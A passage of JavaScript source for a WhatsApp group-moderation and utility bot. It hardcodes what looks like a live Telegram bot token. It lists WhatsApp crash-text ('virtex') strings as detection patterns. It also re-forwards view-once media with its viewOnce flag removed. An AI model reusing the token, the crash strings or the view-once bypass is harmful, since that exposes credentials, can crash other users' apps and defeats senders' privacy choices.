    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
  return result;
  }

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}
        
        async function Telesticker(url) {
    return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return replygcdeepak('Enther your url telegram sticker link')
        packName = url.replace("https://t.me/addstickers/", "")
        data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {method: "GET",headers: {"User-Agent": "GoogleBot"}})
        const deepakresult = []
        for (let i = 0; i < data.data.result.stickers.length; i++) {
            fileId = data.data.result.stickers[i].thumb.file_id
            data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
            result = {
            status: 200,
            author: 'DGDEEPAK',
            url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
            }
            deepakresult.push(result)
        }
    resolve(deepakresult)
    })
}

//mega download
function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';

    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));

    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

//trace anime
function formatDuration(ms) {
  let seconds = Math.floor((ms / 1000) % 60);
  let minutes = Math.floor((ms / (1000 * 60)) % 60);
  let hours = Math.floor((ms / (1000 * 60 * 60)) % 24);
  return `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;
}
        
        //limit func
        async function useLimit(senuseLimitder, amount) {
            db.data.users[sender].limit -= amount
            db.data.users[sender].totalLimit += amount
            replygcdeepak(`You have used up: ${amount} limit\nRemaining: ${db.data.users[sender].limit} limit`)
        }
        async function resetLimit() {
            let users = Object.keys(global.db.data.users)
            let Limitdeepak = isPremium ? limit.prem : limit.free
            for (let i of users) {
               db.data.users[i].limit = Limitdeepak
            }
            DeepakBotInc.sendText('120363167338947238@g.us', { text: `Reset Limit`})
        }
        // Grup Only
        if (!m.isGroup && !DeepakTheCreator && db.data.settings[botNumber].onlygrub ) {
        	if (isCommand){
            return replygcdeepak(`Hello buddy! Because We Want to Reduce Spam, Please Use Bot in the Group Chat !\n\nIf you have issue please chat owner wa.me/${ownernumber}`)
            }
        }
        // Private Only
        if (!DeepakTheCreator && db.data.settings[botNumber].onlypc && m.isGroup) {
        	if (isCommand){
	         return replygcdeepak("Hello buddy! if you want to use this bot, please chat the bot in private chat")
	     }
	}
	     
        if (!DeepakBotInc.public) {
            if (DeepakTheCreator && !m.key.fromMe) return
        }
        if (db.data.settings[botNumber].online) {
        	if (isCommand) {
        	DeepakBotInc.sendPresenceUpdate('unavailable', from)
        }
        }
        if (db.data.settings[botNumber].autoread) {
            DeepakBotInc.readMessages([m.key])
        }
        //auto set bio\\
	if (db.data.settings[botNumber].autobio) {
            DeepakBotInc.updateProfileStatus(`${botname} Have Been Running For ${runtime(process.uptime())}`).catch(_ => _)
        }
     //auto type record
        if (db.data.settings[botNumber].autorecordtype){
        if (isCommand) {
            let deepakmix = ['composing', 'recording']
            deepakmix2 = deepakmix[Math.floor(deepakmix.length * Math.random())]
            DeepakBotInc.sendPresenceUpdate(deepakmix2, from)
        }
        }
        if (db.data.settings[botNumber].autorecord){
        if (isCommand) {
        	let deepakmix = ['recording']
            deepakmix2 = deepakmix[Math.floor(deepakmix.length * Math.random())]
            DeepakBotInc.sendPresenceUpdate(deepakmix2, from)
        }
        }
        if (db.data.settings[botNumber].autotype){
        if (isCommand) {
        	let deepakpos = ['composing']
            DeepakBotInc.sendPresenceUpdate(deepakpos, from)
        }
        }
        
        //auto block number
        if (m.sender.startsWith(`${autoblocknumber}`) && db.data.settings[botNumber].autoblocknum === true) {
            return DeepakBotInc.updateBlockStatus(m.sender, 'block')
        }
        if (!m.sender.startsWith('91') && db.data.settings[botNumber].onlyindia === true) {
            return DeepakBotInc.updateBlockStatus(m.sender, 'block')
        }
        if (!m.sender.startsWith('62') && db.data.settings[botNumber].onlyindo === true) {
            return DeepakBotInc.updateBlockStatus(m.sender, 'block')
        } 
        if (!m.sender.startsWith(`${antiforeignnumber}`) && db.data.chats[m.chat].antiforeignnum === true){ 
        	if (DeepakTheCreator || isAdmins || !isBotAdmins) return
            DeepakBotInc.sendMessage(m.chat, { text: `Sorry buddy! you will be removed because the group admin/owner has enabled anti foreign number, only +${antiforeignnumber} country code is allowed to join the group` }, {quoted: m})
            await sleep(2000)
            await DeepakBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        let list = []
for (let i of owner) {
list.push({
	    	displayName: await DeepakBotInc.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await DeepakBotInc.getName(i)}\nFN:${await DeepakBotInc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
        //console log
        if (isCommand) {
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
            console.log(chalk.black(chalk.bgWhite(!isCommand ? '[ MESSAGE ]' : '[ COMMAND ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
            global.db.data.settings[botNumber].totalhit += 1
        }

        //antiviewonce
    if ( db.data.chats[m.chat].antiviewonce && m.isGroup && m.mtype == 'viewOnceMessageV2') {
        let val = { ...m }
        let msg = val.message?.viewOnceMessage?.message || val.message?.viewOnceMessageV2?.message
        delete msg[Object.keys(msg)[0]].viewOnce
        val.message = msg
        await DeepakBotInc.sendMessage(m.chat, { forward: val }, { quoted: m })
    }
    
    //antispam kick
if (db.data.chats[m.chat].antispam) {
if (m.isGroup && m.message && deepak_antispam.isFiltered(from)) {
console.log(`[SPAM]`, color(moment(m.messageTimestamp * 100).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(m.pushName))
return await DeepakBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}
    
    // Anti promotion
if (db.data.chats[m.chat].antipromotion) {
if (budy.match(`instagram booster|tiktok booster|ml booster|bgmi selling|selling uc|selling diamonds|selling coin|selling id|selling account|selling ids|buy account|sell account|buy id|sell id|instagram followers|tiktok followers|buy panel|sell panel|sell bug bot|buy bug bot|buy bot bug|sell bot bug|adminpanel5kpm|open jasa push member grup|yangmaubuypanelpm|admin panel 10k pm|Hanya menyediakan Jasa Push Member Grup|admin panel 5k pm|yang mau beli panel murah pm|list harga panel by|list harga vps|LIST HARGA VPS|OPEN JASA PUSH MEMBER GRUP|READY|Redy|LIST HARGA PANEL BY|list harga panel|menyediakan|MENYEDIAKAN|OPEN MURBUG|open|OPEN|PANEL READY|PANEL|PANNEL READY|panel|panel ready|pannel ready minat pm|mau panel pm|MAU PANNEL PM|Admin panel ready|ADMIN PANEL READY|Chat aja om ready selalu|OPEN JASA INSTALL|open jasa installMENYEDIAKAN JASA INSTALL|menyediakan jasa install`)) {
if (!isBotAdmins) return
if(DeepakTheCreator) return
if (isAdmins) return
DeepakBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
DeepakBotInc.sendMessage(from, {text:`\`\`\`「 Promotion Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a promotion message and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
}
}

        //ANTI VIRUS
if (isGroup && db.data.chats[m.chat].antivirtex) {
if (budy.includes('๒๒๒๒') || budy.includes('ดุ') || budy.includes('ผิดุท้เึางืผิดุท้เึางื') || budy.includes('๑๑๑๑๑๑๑๑') || budy.includes('৭৭৭৭৭৭৭৭') || budy.includes('   ⃢   ⃢   ⃢  ') || budy.includes('*⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟') || budy.includes('ผดิทุเ้ึางผืดิทุเ้') || budy.includes('.*࡞ࣰࣰࣰࣲࣲࣲࣲࣩࣩࣩࣩࣶࣶ࣯࣯࣮࣮ࣦ࣯ࣨࣨࣨࣻࣻࣻࣼࣼࣼࣽࣽࣾࣷࣵࣴ࣬࣬࣬ࣤࣤࣧࣧ*') || budy.includes('᥋') || budy.includes('؁') || budy.includes('ٯٯٯٯٯ') ) {
if (isGroupAdmins) return replygcdeepak('*VIRTEX DETECTED*')
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
DeepakBotInc.sendText(m.chat, `*MARK AS READ*\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n *Virus sender here👇:* \nwa.me/${sender.split("@")[0]}`)   
if (!isBotAdmins) return
if(DeepakTheCreator) return
DeepakBotInc.groupParticipantsUpdate(from, [sender], 'remove')
await DeepakBotInc.sendMessage(from, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
DeepakBotInc.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/${sender.split("@")[0]} Detected Having Sent Virtex ${isGroup?`in ${groupName}`:''}`})
 }
 }
 
 if (db.data.chats[m.chat].antibot) {
    if (m.isBaileys && m.fromMe == false){
        if (isAdmins || !isBotAdmins){		  
        } else {
          replygcdeepak(`*Another Bot Detected*\n\nHusshhh Get away from this group!!!`)
    return await DeepakBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
    }
   }
 
        //anti media
        if (db.data.chats[m.chat].antimedia && isMedia) {
        if (DeepakTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcdeepak(`\`\`\`「 Media Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-media for this group`)
    return DeepakBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
  }
        if (db.data.chats[m.chat].image && isDeepakMedia) {
    if(isDeepakMedia === "imageMessage"){
        if (DeepakTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcdeepak(`\`\`\`「 Image Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-image for this group`)
    return DeepakBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.chats[m.chat].antivideo && isDeepakMedia) {
    if(isDeepakMedia === "videoMessage"){
        if (DeepakTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcdeepak(`\`\`\`「 Video Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-video for this group`)
    return DeepakBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.chats[m.chat].antisticker && isDeepakMedia) {
    if(isDeepakMedia === "stickerMessage"){
        if (DeepakTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcdeepak(`\`\`\`「 Sticker Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-sticker for this group`)
    return DeepakBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.chats[m.chat].antiaudio && isDeepakMedia) {
    if(isDeepakMedia === "audioMessage"){
        if (DeepakTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcdeepak(`\`\`\`「 Audio Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-audio for this group`)
    return DeepakBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.chats[m.chat].antipoll && isDeepakMedia) {
    if(isDeepakMedia === "pollCreationMessage"){
        if (DeepakTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcdeepak(`\`\`\`「 Poll Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-poll for this group`)
    return DeepakBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.chats[m.chat].antilocation && isDeepakMedia) {
    if(isDeepakMedia === "locationMessage"){
        if (DeepakTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcdeepak(`\`\`\`「 Location Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-location for this group`)
    return DeepakBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.chats[m.chat].antidocument && isDeepakMedia) {
    if(isDeepakMedia === "documentMessage"){
        if (DeepakTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcdeepak(`\`\`\`「 Document Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-document for this group`)
    return DeepakBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
      if (db.data.chats[m.chat].anticontact && isDeepakMedia) {
    if(isDeepakMedia === "contactMessage"){
        if (DeepakTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcdeepak(`\`\`\`「 Contact Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-contact for this group`)
    return DeepakBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        //respond
        if (db.data.chats[m.chat].badword) {
            for (let bak of bad) {
               if (budy === bak) {
                  let baduser = await db.data.users[sender].badword
                  DeepakBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			DeepakBotInc.sendMessage(from, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} was using harsh words and his chat has been deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
               }
            }
        }
        //auto download #ctto
        if (db.data.settings[botNumber].autodownload && !m.key.fromMe && !isCmd2) {
try {
if (budy.match(`instagram.com`)) {
await DeepakBotInc.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/instagram?url=${budy}`)
DeepakBotInc.sendMessage(m.chat, { video: { url: anu.result.media}, caption: `Auto Download ✅`}, {quoted: m})
await DeepakBotInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`tiktok.com`)) {
await DeepakBotInc.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/tiktok?url=${budy}`)
DeepakBotInc.sendMessage(m.chat, { video: { url: anu.result.Medium.url}, caption: `Auto Download ✅`}, {quoted: m})
await DeepakBotInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`facebook.com`)) {
await DeepakBotInc.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/facebook?url=${budy}`)
DeepakBotInc.sendMessage(m.chat, { video: { url: anu.result.video_sd}, caption: `Auto Download ✅`}, {quoted: m})
await DeepakBotInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`youtube.com|youtu.be`)) {
await DeepakBotInc.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/ytmp4?url=${budy}`)
DeepakBotInc.sendMessage(m.chat, { video: { url: anu.result.result}, caption: ``}, {quoted: m})
await DeepakBotInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} 
} catch (err) {
await DeepakBotInc.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
} 
        
        //autosticker
        if (db.data.settings[botNumber].autosticker) {
        	if (m.key.fromMe) return
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                DeepakBotInc.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                DeepakBotInc.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }
        
        if (DeepakBotInc)
			for (let anju of deepakezzyaudio){
				if (budy === anju){
					result = fs.readFileSync(`./DeepakMedia/audio/${anju}.mp3`)
					DeepakBotInc.sendMessage(m.chat, { audio: result, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
					}
			}
        
        if (db.data.chats[m.chat].antilinkgc) {
            if (budy.match(`chat.whatsapp.com`)) {
               bvl = `\`\`\`「 GC Link Detected 」\`\`\`\n\nAdmin has sent a gc link, admin is free to send any link😇`
if (isAdmins) return replygcdeepak(bvl)
if (m.key.fromMe) return replygcdeepak(bvl)
if (DeepakTheCreator) return replygcdeepak(bvl)
               await DeepakBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			DeepakBotInc.sendMessage(from, {text:`\`\`\`「 GC Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
        if (db.data.chats[m.chat].antilink) {
            if (budy.match('http') && budy.match('https')) {
               bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`
if (isAdmins) return replygcdeepak(bvl)
if (m.key.fromMe) return replygcdeepak(bvl)
if (DeepakTheCreator) return replygcdeepak(bvl)
               await DeepakBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			DeepakBotInc.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
        //afk
        let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	     for (let jid of mentionUser) {
            let user = db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            replygcdeepak(`Please Don't Tag Him\nHe's AFK ${reason ? 'With reason ' + reason : 'no reason'}\nAfk Since ${clockString(new Date - afkTime)}`.trim())
        }
        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            replygcdeepak(`You Have Returned From AFK\nAFK Reason: ${user.afkReason ? user.afkReason : ''}\nAFK Duration: ${clockString(new Date - user.afkTime)}`.trim())
            user.afkTime = -1
            user.afkReason = ''
        }
        
//total features
const deepakfeature = () =>{
            var mytext = fs.readFileSync("./Zenitsu7.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
        
        //download status #ctto
        try {
  const textLower = m.text.toLowerCase();
  if (textLower === 'download' || textLower === 'statusdown' || textLower === 'take' || textLower === 'send') {
    const quotedMessage = m.msg.contextInfo.quotedMessage;
    if (quotedMessage) {
      if (quotedMessage.imageMessage) {
        let imageCaption = quotedMessage.imageMessage.caption;
        let imageUrl = await DeepakBotInc.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
        DeepakBotInc.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption });
        replygcdeepak('*Downloading status...*');
      }
      if (quotedMessage.videoMessage) {
        let videoCaption = quotedMessage.videoMessage.caption;
        let videoUrl = await DeepakBotInc.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
        DeepakBotInc.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption });
        replygcdeepak('*Downloading status...*');
      }
    }
  }
} catch (error) {
  console.error("Error in 'send message' handling:", error);
}
        //autoreply
for (let BhosdikaDeepak of VoiceNoteDeepak) {
if (budy === BhosdikaDeepak) {
let audiobuffy = fs.readFileSync(`./DeepakMedia/audio/${BhosdikaDeepak}.mp3`)
DeepakBotInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaDeepak of StickerDeepak){
if (budy === BhosdikaDeepak){
let stickerbuffy = fs.readFileSync(`./DeepakMedia/sticker/${BhosdikaDeepak}.webp`)
DeepakBotInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaDeepak of ImageDeepak){
if (budy === BhosdikaDeepak){
let imagebuffy = fs.readFileSync(`./DeepakMedia/image/${BhosdikaDeepak}.jpg`)
DeepakBotInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaDeepak of VideoDeepak){
if (budy === BhosdikaDeepak){
let videobuffy = fs.readFileSync(`./DeepakMedia/video/${BhosdikaDeepak}.mp4`)
DeepakBotInc.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {
DeepakBotInc.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let BhosdikaDeepak of ApkDeepak) {
if (budy === BhosdikaDeepak) {
let buffer = fs.readFileSync(`./DeepakMedia/apk/${BhosdikaDeepak}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
DeepakBotInc.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let BhosdikaDeepak of ZipDeepak) {
if (budy === BhosdikaDeepak) {
let buffer = fs.readFileSync(`./DeepakMedia/zip/${BhosdikaDeepak}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
DeepakBotInc.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let BhosdikaDeepak of DocDeepak) {
if (budy === BhosdikaDeepak) {
let buffer = fs.readFileSync(`./DeepakMedia/doc/${BhosdikaDeepak}.pdf`)
senddocu(buffer)
}
}

// Response Addlist
if (m.isGroup && isAlreadyResponList(from, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(from, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
DeepakBotInc.sendMessage(from, { text: sendResponList(from, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
DeepakBotInc.sendMessage(from, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m
})
} 
}

// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: m.mentionedJid }, {
    userJid: DeepakBotInc.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, DeepakBotInc.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
DeepakBotInc.ev.emit('messages.upsert', msg)
} 

//============= [LIST RESPONCE CHECKING START ]================
        if(m.mtype === "interactiveResponseMessage"){
            console.log("interactiveResponseMessage Detected!")   
            let msg = m.message[m.mtype]  || m.msg
            if(msg.nativeFlowResponseMessage  && !m.isBot  ){ 
                let { id } = JSON.parse(msg.nativeFlowResponseMessage.paramsJson) || {}  
                if(id){
                    let emit_msg = { 
                        key : { ...m.key } , // SET RANDOME MESSAGE ID  
                        message:{ extendedTextMessage : { text : id } } ,
                        pushName : m.pushName,
                        messageTimestamp  : m.messageTimestamp || 754785898978
                    }
                    return DeepakBotInc.ev.emit("messages.upsert" , { messages : [ emit_msg ] ,  type : "notify"})
                }
            }
        }
//============= [LIST RESPONCE CHECKING END ]================


//math
if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
	if (m.key.fromMe) return
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await replygcdeepak(`🎮 Math Quiz 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Send ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else replygcdeepak('*Wrong Answer!*')
        }
        
        //game
        this.game = this.game ? this.game : {}
        let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
        if (room) {
            let ok
            let isWin = !1
            let isTie = !1
            let isSurrender = !1
            // replygcdeepak(`[DEBUG]\n${parseInt(m.text)}`)
            if (!/^([1-9]|(me)?giveup|surr?ender|off|skip)$/i.test(m.text)) return
            isSurrender = !/^[1-9]$/.test(m.text)
            if (m.sender !== room.game.currentTurn) {
                if (!isSurrender) return !0
            }
            if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
                replygcdeepak({
                    '-3': 'The game is over',
                    '-2': 'Invalid',
                    '-1': 'Invalid Position',
                    0: 'Invalid Position',
